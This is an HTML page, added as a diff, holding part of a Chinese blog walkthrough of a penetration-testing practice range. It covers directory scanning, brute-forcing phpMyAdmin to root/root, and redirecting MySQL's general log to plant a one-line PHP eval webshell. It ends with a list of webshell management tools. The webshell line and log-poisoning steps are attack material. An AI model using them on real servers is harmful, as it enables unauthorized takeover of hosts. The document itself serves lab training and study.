@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Part3.对目标web服务器进行目录扫描和密码爆破 - 黄泽杰Ekko</title><meta name="Description" content="Ekko"><meta property="og:title" content="Part3.对目标web服务器进行目录扫描和密码爆破" />
+<meta property="og:description" content="Part3.对目标web服务器进行目录扫描和密码爆破 使用dirsearch工具进行目录扫描 因为通过前面的nmap端口扫描，我们已经发现了80端口是开放的，所以我们就可以接着使用dirsearch工具对这个ip地址网站进行目录扫描，看看哪些网站可以登录
+针对phpMyAdmin网站进行密码爆破 这里的index.php网站登录进去可以知道这个这个网站是php探针，针对这个网站，我们就可以进行phpadmin爆破
+将网址保存到txt文件中，再通过导入网址，读取txt，就可以进行密码爆破，这里爆破成功的是root，root
+这样我们就成功登录服务器后台
+通过mysql命令更改日志，植入木马 之后我们就可以进行日志中放木马的方式去控制这个主机
+所以，首先我们要查询到日志文件的位置
+这里可以发现这个系统日志是关闭的
+将日志文件设置为自己创建的文件
+再查看一下是否更改成功
+已经成功
+在日志中写入木马 select &#39;&lt;?php eval($ POST[1]); ?&gt;&#39;; 这句话是一句话木马
+在mysql中运行，就会被记录在日志里
+代码审计，打开web服务器文件查看
+接下来如何控制别人电脑呢？
+可以根据web服务器使用的编程语言和框架选择性地使用以下工具：
+AntSword（php） 哥斯拉（php，java） 冰蝎（java） " />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://sxzl798.github.io/hongrisec_1/5.p23-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" /><meta property="article:section" content="hongrisec_1" />
+<meta property="article:published_time" content="2024-10-10T11:34:24+08:00" />
+<meta property="article:modified_time" content="2024-10-10T11:34:24+08:00" /><meta property="og:site_name" content="Ekko" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Part3.对目标web服务器进行目录扫描和密码爆破"/>
+<meta name="twitter:description" content="Part3.对目标web服务器进行目录扫描和密码爆破 使用dirsearch工具进行目录扫描 因为通过前面的nmap端口扫描，我们已经发现了80端口是开放的，所以我们就可以接着使用dirsearch工具对这个ip地址网站进行目录扫描，看看哪些网站可以登录
+针对phpMyAdmin网站进行密码爆破 这里的index.php网站登录进去可以知道这个这个网站是php探针，针对这个网站，我们就可以进行phpadmin爆破
+将网址保存到txt文件中，再通过导入网址，读取txt，就可以进行密码爆破，这里爆破成功的是root，root
+这样我们就成功登录服务器后台
+通过mysql命令更改日志，植入木马 之后我们就可以进行日志中放木马的方式去控制这个主机
+所以，首先我们要查询到日志文件的位置
+这里可以发现这个系统日志是关闭的
+将日志文件设置为自己创建的文件
+再查看一下是否更改成功
+已经成功
+在日志中写入木马 select &#39;&lt;?php eval($ POST[1]); ?&gt;&#39;; 这句话是一句话木马
+在mysql中运行，就会被记录在日志里
+代码审计，打开web服务器文件查看
+接下来如何控制别人电脑呢？
+可以根据web服务器使用的编程语言和框架选择性地使用以下工具：
+AntSword（php） 哥斯拉（php，java） 冰蝎（java） "/>
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://sxzl798.github.io/hongrisec_1/5.p23-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" /><link rel="prev" href="http://sxzl798.github.io/hongrisec_1/6.p23media-note-phpmyadmin%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97-getshell/" /><link rel="next" href="http://sxzl798.github.io/hongrisec_1/4.p21-%E6%89%93%E7%82%B9%E6%8A%80%E6%9C%AF%E5%92%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Part3.对目标web服务器进行目录扫描和密码爆破",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/sxzl798.github.io\/hongrisec_1\/5.p23-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4\/"
+        },"genre": "hongrisec_1","keywords": "hongrisec_1靶场","wordcount":  28 ,
+        "url": "http:\/\/sxzl798.github.io\/hongrisec_1\/5.p23-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4\/","datePublished": "2024-10-10T11:34:24+08:00","dateModified": "2024-10-10T11:34:24+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "黄泽杰"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="黄泽杰Ekko">黄泽杰Ekko</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="黄泽杰Ekko">黄泽杰Ekko</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">Part3.对目标web服务器进行目录扫描和密码爆破</h1><div class="content" id="content"><h1 id="part3对目标web服务器进行目录扫描和密码爆破">Part3.对目标web服务器进行目录扫描和密码爆破</h1>
+<h3 id="使用dirsearch工具进行目录扫描">使用dirsearch工具进行目录扫描</h3>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409121957614.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409121957614.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409121957614.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409121957614.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409121957614.png"
+        title="image-20240912195755364" /><p>因为通过前面的nmap端口扫描，我们已经发现了80端口是开放的，所以我们就可以接着使用dirsearch工具对这个ip地址网站进行目录扫描，看看哪些网站可以登录</p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409121958242.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409121958242.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409121958242.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409121958242.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409121958242.png"
+        title="image-20240912195809141" /><h3 id="针对phpmyadmin网站进行密码爆破">针对phpMyAdmin网站进行密码爆破</h3>
+<p>这里的index.php网站登录进去可以知道这个这个网站是php探针，针对这个网站，我们就可以进行phpadmin爆破</p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122001813.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122001813.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409122001813.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409122001813.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122001813.png"
+        title="image-20240912200133756" /><p>将网址保存到txt文件中，再通过导入网址，读取txt，就可以进行密码爆破，这里爆破成功的是root，root</p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122003571.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122003571.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409122003571.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409122003571.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122003571.png"
+        title="image-20240912200315437" /><p>这样我们就成功登录服务器后台</p>
+<h3 id="通过mysql命令更改日志植入木马">通过mysql命令更改日志，植入木马</h3>
+<p>之后我们就可以进行日志中放木马的方式去控制这个主机</p>
+<p>所以，首先我们要查询到日志文件的位置</p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122005460.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122005460.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409122005460.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409122005460.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122005460.png"
+        title="image-20240912200532363" /><p>这里可以发现这个系统日志是关闭的</p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122006347.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122006347.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409122006347.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409122006347.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122006347.png"
+        title="image-20240912200656232" /><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130944190.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130944190.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409130944190.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409130944190.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130944190.png"
+        title="image-20240913094453158" /><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122014591.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122014591.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409122014591.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409122014591.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409122014591.png"
+        title="image-20240912201408947" /><p>将日志文件设置为自己创建的文件</p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130938119.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130938119.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409130938119.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409130938119.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130938119.png"
+        title="image-20240913093810029" /><p>再查看一下是否更改成功</p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130944324.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130944324.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409130944324.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409130944324.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130944324.png"
+        title="image-20240913094416274" /><p>已经成功</p>
+<h3 id="在日志中写入木马">在日志中写入木马</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="k">select</span> <span class="s1">&#39;&lt;?php eval($ POST[1]); ?&gt;&#39;</span><span class="p">;</span>
+</span></span></code></pre></div><p>这句话是<a href="" rel="">一句话木马</a></p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130954653.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130954653.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409130954653.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409130954653.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409130954653.png"
+        title="image-20240913095459564" /><p>在mysql中运行，就会被记录在日志里</p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409131000413.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409131000413.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409131000413.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409131000413.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409131000413.png"
+        title="image-20240913100028312" /><p>代码审计，打开web服务器文件查看</p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409131005916.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409131005916.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409131005916.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409131005916.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409131005916.png"
+        title="image-20240913100502842" /><p>接下来如何控制别人电脑呢？</p>
+<p>可以根据web服务器使用的编程语言和框架选择性地使用以下工具：</p>
+<ol>
+<li>AntSword（php）</li>
+<li>哥斯拉（php，java）</li>
+<li>冰蝎（java）</li>
+</ol>
+</div></div></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">黄泽杰</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
